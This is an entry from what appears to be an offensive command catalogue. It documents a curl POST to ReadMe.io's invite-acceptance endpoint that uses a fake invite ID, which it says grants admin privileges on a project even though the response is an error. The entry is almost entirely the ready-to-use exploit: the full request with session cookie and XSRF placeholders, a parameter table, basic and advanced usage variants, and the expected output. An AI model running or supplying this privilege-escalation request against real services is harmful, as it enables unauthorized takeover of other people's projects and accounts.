---
id: cmd-post-invite-bypass
data: >-
  curl -X POST
  'https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d' -H 'Host:
  dash.readme.io' -H 'Connection: close' -H 'Content-Length: 2' -H 'Accept:
  application/json, text/plain, */*' -H 'Origin: https://dash.readme.io' -H
  'X-XSRF-TOKEN: <your_token>' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103
  Safari/537.36' -H 'DNT: 1' -H 'Referer: https://dash.readme.io/' -H
  'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language:
  en-GB,en-US;q=0.8,en;q=0.6' -H 'Cookie: <your_cookies>' -d '{}'
tags:
  - http-post
  - bypass
  - api
type: command
output: '{"error":"Invite doesn''t exist"}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.362Z'
verified: false
validated: true
submitted: true
---
# post-accept-nonexistent-invite

## Command

```bash
curl -X POST 'https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d' \
  -H 'Host: dash.readme.io' \
  -H 'Connection: close' \
  -H 'Content-Length: 2' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Origin: https://dash.readme.io' \
  -H 'X-XSRF-TOKEN: <your_token>' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36' \
  -H 'DNT: 1' \
  -H 'Referer: https://dash.readme.io/' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Accept-Language: en-GB,en-US;q=0.8,en;q=0.6' \
  -H 'Cookie: <your_cookies>' \
  -d '{}'
```

## Description

This cURL command sends a POST request to ReadMe.io's invite acceptance endpoint using a non-existent invite ID, exploiting a validation flaw to grant admin access to the associated project. Used after authentication to bypass controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d` | Endpoint with fake invite ID | Yes |
| `-H 'X-XSRF-TOKEN: <your_token>'` | CSRF token from session | Yes |
| `-H 'Cookie: <your_cookies>'` | Authenticated session cookies | Yes |
| `-d '{}'` | Empty JSON body | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://dash.readme.io/api/accept-invite/FAKEID' -H 'X-XSRF-TOKEN: token' -H 'Cookie: session=abc' -d '{}'
```

### Advanced Usage

Include full headers as shown in the command for realism:

```bash
curl -X POST 'https://dash.readme.io/api/accept-invite/5617f98f7f74330d00dfd86d' [full headers] -d '{}'
```

## Expected Output

JSON error response: {"error":"Invite doesn't exist"}. Despite the error, the dashboard grants admin privileges to the project.

## Related

- [[Related Procedure: Bypass-Invite-Validation-to-Gain-Admin-Access]]
